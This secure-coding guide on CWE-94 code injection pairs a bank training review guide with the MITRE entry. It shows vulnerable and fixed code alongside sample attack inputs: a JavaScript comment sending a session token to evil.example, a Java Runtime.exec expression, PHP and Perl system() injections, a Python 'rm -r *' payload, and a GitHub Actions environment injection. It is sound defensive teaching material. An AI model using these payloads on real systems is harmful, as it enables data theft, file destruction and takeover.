# CWE-94: Improper Control of Generation of Code ('Code Injection')

> **2025 CWE Top 25:** rank 10 · score 7.57 · CVEs in CISA KEV: 7 · change since 2024: +1
>  
> **Name in MITRE CWE v5.0:** Improper Control of Generation of Code

## Part 1: Review guide

### What it is, in plain words

The application builds code (or an expression) from input and runs it, so the attacker's text becomes program logic.

### How to spot it

**Java**
- SpEL `StandardEvaluationContext` with user expressions
- `ScriptEngine.eval` (Nashorn/Graal), Groovy shells, OGNL/MVEL with input
- Template engines evaluating user-supplied templates

**C#**
- Roslyn `CSharpScript.EvaluateAsync` with input
- `DataTable.Compute`/dynamic LINQ with user expressions
- Razor templates compiled from user text

**React / Node.js**
- `eval`, `new Function`, `vm.runInContext` with user data
- `setTimeout`/`setInterval` with string arguments
- Executing AI- or LLM-generated code without a sandbox

### Not this weakness (safe look-alikes)

- SpEL `SimpleEvaluationContext`; rules stored as data and interpreted by fixed code.
- JSON parsing (`JSON.parse`) — this does not run code.

### How to tell it apart from related weaknesses

Code in the application's own language is CWE-94; OS commands are CWE-78; SQL is CWE-89; template/XSS in the browser is CWE-79.

### Vulnerable and secure examples

#### Java

Vulnerable:

```java
Expression e = parser.parseExpression(rule);
e.getValue(new StandardEvaluationContext(tx));
// rule = T(java.lang.Runtime)
//   .getRuntime().exec('...')
```

Why: StandardEvaluationContext lets an expression call any Java class.

Secure:

```java
EvaluationContext ctx = SimpleEvaluationContext
  .forReadOnlyDataBinding().build();
parser.parseExpression(rule).getValue(ctx, tx);
```

Why it works: SimpleEvaluationContext only reads properties: no types, no method calls on classes.

#### C#

Vulnerable:

```csharp
// Microsoft.CodeAnalysis.CSharp.Scripting
var fee = await CSharpScript
  .EvaluateAsync<decimal>(rule, globals: tx);
// rule can call any .NET API:
// files, processes, network
```

Why: A script engine runs the rule with the service’s full permissions.

Secure:

```csharp
// rule = { Op: ">", Value: 500000, Fee: 50 }
bool applies = rule.Op switch {
  ">"  => tx.Amount > rule.Value,
  "<=" => tx.Amount <= rule.Value,
  _    => throw new InvalidOperationException() };
```

Why it works: A fixed set of operators, chosen by our code.

#### React / Node.js

Vulnerable:

```jsx
// fee rule typed on the admin screen
const fee = new Function("amount",
  `return ${rule}`)(amount);
// rule = fetch("//evil.example?t="
//          + localStorage.token)
```

Why: new Function and eval run the rule text as JavaScript in the staff member’s session.

Secure:

```jsx
// rule stored as data: { op, value, fee }
const OPS = {
  ">": (a, b) => a > b,
  "<=": (a, b) => a <= b };
const applies = OPS[rule.op]?.(amount, rule.value);
const fee = applies ? rule.fee : 0;
```

Why it works: Rules are data, looked up from a fixed list. The same goes for code an AI model returns.

### Fix guidance

**Primary defences**

1. **Rules as data, not code.** Field, operator and value from fixed lists.
2. **Restricted evaluators.** SimpleEvaluationContext; no script engines on user text.
3. **Patch frameworks fast.** Equifax was code injection in Apache Struts.

**Defence in depth**

- Allow-list operators and fields
- Review user-editable templates
- SAST rules for eval and script engines
- Least privilege for the service

**In each stack**

- Java: SimpleEvaluationContext only
- C#: switch on allowed operators
- React / Node.js: No eval or new Function

**Don't rely on**

- Blocklisting words like Runtime
- Trusting staff-only screens
- Running AI-generated code automatically

### How to verify the fix

A rule containing T(…) is rejected; normal rules still work.

### Severity guide (Providus)

Critical: it usually means full control of the application.

---

## Part 2: MITRE CWE entry (complete)

**Abstraction:** Base · **Structure:** Simple · **Status:** Draft  
**MITRE page:** https://cwe.mitre.org/data/definitions/94.html
  
**MITRE diagram:** https://cwe.mitre.org/data/images/CWE-94-Diagram.png

### Description

The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.

### Alternate terms

- **Code Injection**

### Common consequences

| Scope | Impact | Likelihood | Note |
|---|---|---|---|
| Access Control | Bypass Protection Mechanism |  | In some cases, injectable code controls authentication; this may lead to a remote vulnerability. |
| Access Control | Gain Privileges or Assume Identity |  | Injected code can access resources that the attacker is directly prevented from accessing. |
| Integrity, Confidentiality, Availability | Execute Unauthorized Code or Commands |  | When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. As a result, code injection can often result in the execution of arbitrary code. Code injection attacks can also lead to loss of data integrity in nearly all cases, since the control-plane data injected is always incidental to data recall or writing. |
| Non-Repudiation | Hide Activities |  | Often the actions performed by injected control code are unlogged. |

### Likelihood of exploit

Medium

### Modes of introduction

- **Implementation**: REALIZATION: This weakness is caused during implementation of an architectural security tactic.

### Applicable platforms

- Language: Class: Interpreted (Sometimes)
- Language: Python (Undetermined)
- Technology: AI/ML (Undetermined)

### Weakness ordinalities

- **Primary**
- **Resultant**

### Potential mitigations

**1. Phase: Architecture and Design** · Strategy: Refactoring

Refactor your program so that you do not have to dynamically generate code.

**2. Phase: Architecture and Design**

Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product.

Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.

This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.

Be careful to avoid CWE-243 and other weaknesses related to jails.

**3. Phase: Implementation** · Strategy: Input Validation · ID: MIT-5

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."

Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().

**4. Phase: Testing**

Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.

**5. Phase: Operation** · Strategy: Compilation or Build Hardening · ID: MIT-32

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).

**6. Phase: Operation** · Strategy: Environment Hardening · ID: MIT-32

Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).

**7. Phase: Implementation**

For Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].

*Effectiveness: Discouraged Common Practice*

### Detection methods

**Automated Static Analysis** (effectiveness: High)

Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)

### Demonstrative examples

**Example 1**

This example attempts to write user messages to a message file and allow users to view them.

*Bad code (PHP):*

```php
$MessageFile = "messages.out";
if ($_GET["action"] == "NewMessage") {
    $name = $_GET["name"];
    $message = $_GET["message"];
    $handle = fopen($MessageFile, "a+");
    fwrite($handle, "<b>$name</b> says '$message'<hr>\n");
    fclose($handle);
    echo "Message Saved!<p>\n";
}
else if ($_GET["action"] == "ViewMessages") {
    include($MessageFile);
}
```

While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:

*Attack code:*

```
name=h4x0r
message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
```

which will decode to the following:

*Attack code:*

```
<?php system("/bin/ls -l");?>
```

The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.

Notice that XSS (CWE-79) is also possible in this situation.

**Example 2**

edit-config.pl: This CGI script is used to modify settings in a configuration file.

*Bad code (Perl):*

```perl
use CGI qw(:standard);
sub config_file_add_key {
    my ($fname, $key, $arg) = @_;
    # code to add a field/key to a file goes here
}
sub config_file_set_key {
    my ($fname, $key, $arg) = @_;
    # code to set key to a particular file goes here
}
sub config_file_delete_key {
    my ($fname, $key, $arg) = @_;
    # code to delete key from a particular file goes here
}
sub handleConfigAction {
    my ($fname, $action) = @_;
    my $key = param('key');
    my $val = param('val');
    # this is super-efficient code, especially if you have to invoke
    # any one of dozens of different functions!
    my $code = "config_file_$action_key(\$fname, \$key, \$val);";
    eval($code);
}
$configfile = "/home/cwe/config.txt";
print header;
if (defined(param('action'))) {
    handleConfigAction($configfile, param('action'));
}
else {
    print "No action specified!\n";
}
```

The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:

*Attack code:*

```
add_key(",","); system("/bin/ls");
```

This would produce the following string in handleConfigAction():

*Result code:*

```
config_file_add_key(",","); system("/bin/ls");
```

Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.

**Example 3**

This simple python3 script asks a user to supply a comma-separated list of numbers as input and adds them together.

*Bad code (Python):*

```python
def main():
    sum = 0
    try:
        numbers = eval(input("Enter a comma-separated list of numbers: "))
    except SyntaxError:
        print("Error: invalid input")
        return
    for num in numbers:
        sum = sum + num
    print(f"Sum of {numbers} = {sum}")
main()
```

The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:

*Attack code:*

```
__import__('subprocess').getoutput('rm -r *')
```

This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.

A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.

*Good code (Python):*

```python
def main():
    sum = 0
    numbers = input("Enter a comma-separated list of numbers: ").split(",")
    try:
        for num in numbers:
            sum = sum + int(num)
        print(f"Sum of {numbers} = {sum}")
    except ValueError:
        print("Error: invalid input")
main()
```

An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].

**Example 4**

The following code is a workflow job written using YAML. The code attempts to download pull request artifacts, unzip from the artifact called pr.zip and extract the value of the file NR into a variable "pr_number" that will be used later in another job. It attempts to create a github workflow environment variable, writing to $GITHUB_ENV. The environment variable value is retrieved from an external resource.

*Bad code (Other):*

```
name: Deploy Preview
jobs:
    deploy:
        runs-on: ubuntu-latest
        steps:
            - name: 'Download artifact'
            uses: actions/github-script
            with:
                script: |
                    var artifacts = await github.actions.listWorkflowRunArtifacts({
                        owner: context.repo.owner,
                        repo: context.repo.repo,
                        run_id: ${{ github.event.workflow_run.id }},
                    });
                    var matchPrArtifact = artifacts.data.artifacts.filter((artifact) => {
                        return artifact.name == "pr"
                    })[0];
                    var downloadPr = await github.actions.downloadArtifact({
                        owner: context.repo.owner,
                        repo: context.repo.repo,
                        artifact_id: matchPrArtifact.id,
                        archive_format: 'zip',
                    });
                    var fs = require('fs');
                    fs.writeFileSync('${{github.workspace}}/pr.zip', Buffer.from(downloadPr.data));
            - run: |
                unzip pr.zip
                echo "pr_number=$(cat NR)" >> $GITHUB_ENV
```

The code does not neutralize the value of the
 file NR, e.g. by validating that NR only contains a
 number (CWE-1284). The NR file is attacker controlled
 because it originates from a pull request that produced
 pr.zip.

The attacker could escape the existing
 pr_number and create a new variable using a "\n"
 (CWE-93) followed by any environment variable to be
 added such as:

*Attack code:*

```
\nNODE_OPTIONS="--experimental-modules --experiments-loader=data:text/javascript,console.log('injected code');//"
```

This would result in injecting and running
 javascript code (CWE-94) on the workflow runner with
 elevated privileges.

*Good code (Other):*

```
The code could be modified to validate that the NR
file only contains a numeric value, or the code could
retrieve the PR number from a more trusted source.
```

### Observed examples (real vulnerabilities)

| Reference | Description |
|---|---|
| [CVE-2023-29374](https://www.cve.org/CVERecord?id=CVE-2023-29374) | Math component in an LLM framework translates user input into a Python expression that is input into the Python exec() method, allowing code execution - one variant of a "prompt injection" attack. |
| [CVE-2024-5565](https://www.cve.org/CVERecord?id=CVE-2024-5565) | Python-based library uses an LLM prompt containing user input to dynamically generate code that is then fed as input into the Python exec() method, allowing code execution - one variant of a "prompt injection" attack. |
| [CVE-2024-4181](https://www.cve.org/CVERecord?id=CVE-2024-4181) | Framework for LLM applications allows eval injection via a crafted response from a hosting provider. |
| [CVE-2022-2054](https://www.cve.org/CVERecord?id=CVE-2022-2054) | Python compiler uses eval() to execute malicious strings as Python code. |
| [CVE-2021-22204](https://www.cve.org/CVERecord?id=CVE-2021-22204) | Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV. |
| [CVE-2020-8218](https://www.cve.org/CVERecord?id=CVE-2020-8218) | "Code injection" in VPN product, as exploited in the wild per CISA KEV. |
| [CVE-2008-5071](https://www.cve.org/CVERecord?id=CVE-2008-5071) | Eval injection in PHP program. |
| [CVE-2002-1750](https://www.cve.org/CVERecord?id=CVE-2002-1750) | Eval injection in Perl program. |
| [CVE-2008-5305](https://www.cve.org/CVERecord?id=CVE-2008-5305) | Eval injection in Perl program using an ID that should only contain hyphens and numbers. |
| [CVE-2002-1752](https://www.cve.org/CVERecord?id=CVE-2002-1752) | Direct code injection into Perl eval function. |
| [CVE-2002-1753](https://www.cve.org/CVERecord?id=CVE-2002-1753) | Eval injection in Perl program. |
| [CVE-2005-1527](https://www.cve.org/CVERecord?id=CVE-2005-1527) | Direct code injection into Perl eval function. |
| [CVE-2005-2837](https://www.cve.org/CVERecord?id=CVE-2005-2837) | Direct code injection into Perl eval function. |
| [CVE-2005-1921](https://www.cve.org/CVERecord?id=CVE-2005-1921) | MFV. code injection into PHP eval statement using nested constructs that should not be nested. |
| [CVE-2005-2498](https://www.cve.org/CVERecord?id=CVE-2005-2498) | MFV. code injection into PHP eval statement using nested constructs that should not be nested. |
| [CVE-2005-3302](https://www.cve.org/CVERecord?id=CVE-2005-3302) | Code injection into Python eval statement from a field in a formatted file. |
| [CVE-2007-1253](https://www.cve.org/CVERecord?id=CVE-2007-1253) | Eval injection in Python program. |
| [CVE-2001-1471](https://www.cve.org/CVERecord?id=CVE-2001-1471) | Chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement. |
| [CVE-2002-0495](https://www.cve.org/CVERecord?id=CVE-2002-0495) | Perl code directly injected into CGI library file from parameters to another CGI program. |
| [CVE-2005-1876](https://www.cve.org/CVERecord?id=CVE-2005-1876) | Direct PHP code injection into supporting template file. |
| [CVE-2005-1894](https://www.cve.org/CVERecord?id=CVE-2005-1894) | Direct code injection into PHP script that can be accessed by attacker. |
| [CVE-2003-0395](https://www.cve.org/CVERecord?id=CVE-2003-0395) | PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script. |

### Relationships

Includes relationships recorded on this entry and those recorded on other entries that point to it (as MITRE's page shows them).

| Nature | CWE | Name | View | Recorded on |
|---|---|---|---|---|
| ChildOf (primary) | CWE-74 | Improper Neutralization of Special Elements in Output Used by a Downstream Component | 1000 Complete Weakness Hierarchy | this entry |
| ChildOf | CWE-913 | Improper Control of Dynamically-Managed Code Resources | 1000 Complete Weakness Hierarchy | this entry |
| ChildOf (primary) | CWE-74 | Improper Neutralization of Special Elements in Output Used by a Downstream Component | 1003 Weaknesses for Simplified Mapping of Published Vulnerabilities | this entry |
| ParentOf | CWE-95 | Improper Neutralization of Directives in Dynamically Evaluated Code | 1000 Complete Weakness Hierarchy | CWE-95 |
| ParentOf | CWE-96 | Improper Neutralization of Directives in Statically Saved Code | 1000 Complete Weakness Hierarchy | CWE-96 |
| ParentOf | CWE-1336 | Improper Neutralization of Special Elements Used in a Template Engine | 1000 Complete Weakness Hierarchy | CWE-1336 |
| CanFollow | CWE-98 | Improper Control of Filename for Include/Require Statement in PHP Program | 1000 Complete Weakness Hierarchy | CWE-98 |

### Related attack patterns (CAPEC)

[CAPEC-242](https://capec.mitre.org/data/definitions/242.html), [CAPEC-35](https://capec.mitre.org/data/definitions/35.html), [CAPEC-77](https://capec.mitre.org/data/definitions/77.html)

### Taxonomy mappings

| Taxonomy | Entry ID | Entry name | Fit |
|---|---|---|---|
| PLOVER | CODE | Code Evaluation and Injection |  |
| ISA/IEC 62443 | Part 4-2 | Req CR 3.5 |  |
| ISA/IEC 62443 | Part 3-3 | Req SR 3.5 |  |
| ISA/IEC 62443 | Part 4-1 | Req SVV-1 |  |
| ISA/IEC 62443 | Part 4-1 | Req SVV-3 |  |

### Vulnerability mapping notes

**Usage:** Allowed-with-Review

**Rationale:** This entry is frequently misused for vulnerabilities with a technical impact of "code execution," which does not by itself indicate a root cause weakness, since dozens of weaknesses can enable code execution.

**Comments:** This weakness only applies when the product's functionality intentionally constructs all or part of a code segment. It could be that executing code could be the result of other weaknesses that do not involve the construction of code segments.

**Reasons:** Frequent Misuse, Frequent Misinterpretation

### Notes

**Theoretical:** Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features that classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.

### Memberships

Categories and views this entry belongs to (for example OWASP Top Ten and earlier CWE Top 25 lists).

| Type | ID | Name |
|---|---|---|
| Category | 137 | Data Neutralization Issues |
| View | 635 | Weaknesses Originally Used by NVD from 2008 to 2016 |
| Category | 752 | 2009 Top 25 - Risky Resource Management |
| View | 884 | CWE Cross-section |
| Category | 991 | SFP Secondary Cluster: Tainted Input to Environment |
| Category | 1019 | Validate Inputs |
| View | 1200 | Weaknesses in the 2019 CWE Top 25 Most Dangerous Software Errors |
| Category | 1347 | OWASP Top Ten 2021 Category A03:2021 - Injection |
| View | 1350 | Weaknesses in the 2020 CWE Top 25 Most Dangerous Software Weaknesses |
| View | 1387 | Weaknesses in the 2022 CWE Top 25 Most Dangerous Software Weaknesses |
| Category | 1409 | Comprehensive Categorization: Injection |
| View | 1425 | Weaknesses in the 2023 CWE Top 25 Most Dangerous Software Weaknesses |
| View | 1430 | Weaknesses in the 2024 CWE Top 25 Most Dangerous Software Weaknesses |
| View | 1435 | Weaknesses in the 2025 CWE Top 25 Most Dangerous Software Weaknesses |
| Category | 1440 | OWASP Top Ten 2025 Category A05:2025 - Injection |
| Category | 1447 | General Software Weaknesses that Appear in Products that Use or Support AI/ML Technology |

### References

- [REF-44] Michael Howard, David LeBlanc, John Viega. "24 Deadly Sins of Software Security", 2010, "Sin 3: Web-Client Related Vulnerabilities (XSS)." Page 63
- [REF-1372] "How ast.literal_eval can cause memory exhaustion", 2022. https://www.reddit.com/r/learnpython/comments/zmbhcf/how_astliteral_eval_can_cause_memory_exhaustion/
- [REF-1373] "ast - Abstract Syntax Trees", 2023, ast.literal_eval(node_or_string). https://docs.python.org/3/library/ast.html#ast.literal_eval

### Content history (summary)

- Submitted: 2006-07-19 by PLOVER
- Modified 36 times; latest: 2026-10-28
- Previous names: "Code Injection" (until 2009-01-12); "Failure to Control Generation of Code (aka 'Code Injection')" (until 2009-05-27); "Failure to Control Generation of Code ('Code Injection')" (until 2011-03-29); "Improper Control of Generation of Code ('Code Injection')" (until 2026-10-28)
- Full history: https://cwe.mitre.org/data/definitions/94.html#Content_History

---

*Part 2 is taken from the MITRE CWE List, version 5.0 (2026-10-28), https://cwe.mitre.org. Copyright © 2006–2026, The MITRE Corporation. CWE, CWSS, CWRAF, and the CWE logo are trademarks of The MITRE Corporation. Used under the CWE Terms of Use (https://cwe.mitre.org/about/termsofuse.html). Part 1 was written for the Providus Bank Secure Coding programme by Training Heights.*
